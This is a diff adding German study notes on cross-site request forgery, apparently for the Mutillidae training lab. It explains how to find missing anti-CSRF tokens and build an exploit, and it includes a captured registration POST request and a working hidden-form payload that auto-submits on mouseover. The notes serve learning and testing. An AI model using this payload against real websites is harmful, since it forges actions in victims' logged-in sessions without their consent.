@@ -1,0 +1,63 @@
+#########################################
+### CROSS-SITE REQUEST FORGERY (CSRF) ###
+#########################################
+
+ALLGEMEIN:
+
+- 	ein Angreifer kann ein Skript im Browser eines legitimierten 		Nutzers ausführen
+- 	um einen legitimierten Request zu generieren, sendet das 		Skript die gleichen Parameter zur Webseite, wie sie ein User 		senden würde
+
+==> 	die Webseite geht von einer authorisierten Nutzer-Anfrage aus 		und kann nicht das Schadskript detektieren
+
+
+DETECT A VULNERABILITY:
+
+- 	die anvisierte Webseite auf eingebettete Tokens überprüfen
+-	diese werden mit jedem Formular-Request gesendet, um den 		Request	einzigartig zu machen
+-	ein Token kann ein Random-String, ein CAPTCHA oder ähnliches 		sein
+-	existieren Tokens, hat die Webseite eine Methode, um Forged 		Requests zu detektieren
+-	ohne Tokens, kann die Webseite anfällig für CSRF sein
+
+DETECT A EXPLOIT:
+
+	1. Übertrage das legitime Formular und notiere jeden 		Parameter, der an den Server für einen erfolgreichen Request 		gesendet wird
+
+	2. Generiere HTML oder JavaScript, das die gleichen 		Parameter zur Webseite schickt, als wenn der User das 		legitime Senden ausführen würde
+	
+	3. Dies wird von einem Sende-Event ausgelöst: z.B. onclick, 		onload, onmouseover des legitimierten Users
+
+Beispiel eines Request-Headers der Mutillidae-Register-Seite
+
+-	Wichtig sind die GET-Queries, die beim Absenden des 		Formulars mitgeschickt werden
+-	"username", "password", "confirm_password" und 		"my_signature" werden beim versteckten CSRF-Formular 		verwendet
+#####################################################################
+POST /index.php?page=register.php HTTP/1.1 
+Host: mutillidae 
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.11) Gecko/20101013 Ubuntu/9.04 (jaunty) Firefox/3.6.11 
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
+Accept-Language: en-us,en;q=0.5 
+Accept-Encoding: gzip,deflate 
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 
+Keep-Alive: 115 Proxy-Connection: keep-alive 
+Referer: http://mutillidae/index.php?page=register.php 
+Cookie: PHPSESSID=1a28b85b825be0e5c9dc2789c63a3b44 
+Content-Type: application/x-www-form-urlencoded 
+Content-Length: 122 
+
+username=username1&;password=pass1&confirm_password=pass1&my_signature=signature1&register-php-submit-button=Create+Account
+######################################################################
+
+==> daraus resultierendes Hidden-Formular
+
+
+######################################################################
+<form id="CSRF" method="POST" action="/index.php?page=register.php"> 
+
+<input name="username" value="sammy" type="hidden" /> 
+<input name="password" value="samurai" type="hidden" /> 
+<input name="confirm_password" value="samurai" type="hidden" /> <input name="my_signature" value="The password is samurai" type="hidden" /> 
+<input name="register-php-submit-button" value="Create+Account" type="hidden" /> 
+</form> <span onmouseover="try{var lURL=document.location.href;document.getElementById(\'CSRF\').submit();document.location.href=lURL;}catch(e){alert(e.message);}">Hello World</span>
+#######################################################################
+
+
